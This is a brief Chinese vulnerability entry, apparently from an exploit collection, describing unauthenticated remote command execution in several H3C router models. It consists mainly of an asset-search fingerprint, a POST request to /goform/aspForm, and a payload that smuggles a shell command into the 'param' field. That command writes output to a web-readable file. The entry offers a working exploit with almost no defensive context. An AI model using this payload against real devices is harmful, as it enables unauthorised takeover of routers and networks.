# H3C多系列路由器存在前台远程命令执行漏洞

- **系统**：H3C　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="H3C Router Management"`
- **请求**：`POST /goform/aspForm HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 76`

**请求体 / payload**
```
CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);
/test
```

**其他**
- H3C多系列路由器存在前台远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * H3C多系列路由器